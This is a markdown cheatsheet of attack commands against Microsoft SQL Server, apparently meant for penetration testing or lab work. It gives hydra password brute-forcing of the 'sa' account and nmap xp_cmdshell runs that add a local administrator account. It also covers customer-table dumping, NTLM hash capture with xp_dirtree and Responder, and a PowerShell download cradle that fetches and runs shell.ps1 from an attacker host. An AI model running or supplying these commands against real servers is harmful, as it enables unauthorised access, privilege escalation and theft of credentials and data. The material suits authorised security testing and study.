# Cheatsheet

## Brute-forcing 

```
 hydra -l sa –P /path/to/rockyou.txt 10.10.10.125 mssql
```
## Nmap
```
nmap –script "ms-sql and not ms-sql-brute" "–script-args=mssql.username=sa,mssql.password=password,ms-sql-config.showall=true,ms-sql-tables.maxdb=0,ms-sql-tables.maxtables=0,ms-sql-xp-cmdshell.cmd=ipconfig /all" -d -oN mssql.nmap -Pn -v -sV –version-intensity 9 -T2 -p T:27900,U:1434 10.33.1.33

nmap -sV -T2 -Pn -n -sS –script=ms-sql-xp-cmdshell.nse -p1433 –script-args mssql.username=sa,mssql.password=poiuytrewq,ms-sql-xp-cmdshell.cmd="net user walter P@ssWORD1234 /add" 10.33.1.33

nmap -sV -T2 -Pn -n -sS –script=ms-sql-xp-cmdshell.nse -p1433 –script-args mssql.username=sa,mssql.password=poiuytrewq,ms-sql-xp-cmdshell.cmd="net localgroup administrators walter /add" 10.33.1.33

nmap -v -sV –version-intensity 9 -T2 -p T:27900,U:1433 –script ms-sql-query –script-args mssql.username=sa,mssql.password=password,mssql.database=bankdb,ms-sql-query.query="SELECT * FROM tblCustomers" 10.33.1.33
```
## Capture hash 
Run responder and do:
```
xp_dirtree "\\10.10.14.8\test"
```
## Enable xp_cmdshell
`mssqlclient.py`  has `enable_xp_cmdshell`

```
exec sp_configure 'show advanced options', 1
RECONFIGURE
exec sp_configure 'xp_cmdshell', 1
RECONFIGURE
```

```
xp_cmdshell powershell iex(New-Object System.Net.WebClient).DownloadString(\"http://10.10.14.8/shell.ps1\")
```
## Disable xp_cmdshell
```
exec sp_configure 'show advanced options', '1'
RECONFIGURE
exec sp_configure 'xp_cmdshell', '0'
RECONFIGURE
```

## Grant permissions to xp_cmdshell
Let's say we have a user that is not a sysadmin, but is a user of the master database and we want to grant access to run xp_cmdshell:
```
-- add user test to the master database
USE [master]
GO
CREATE USER [test] FOR LOGIN [test]
GO

-- grant execute access to xp_cmdshell
GRANT EXEC ON xp_cmdshell TO [test]
```

## List all databases
```
EXEC sp_databases;
select * from sysobjects where xtype = 'U';
```

## Nmap Enumeration
```
nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER $ip
```

## Connect from Linux

```
sqsh -S someserver -U sa -P poiuytrewq -D bankdb
```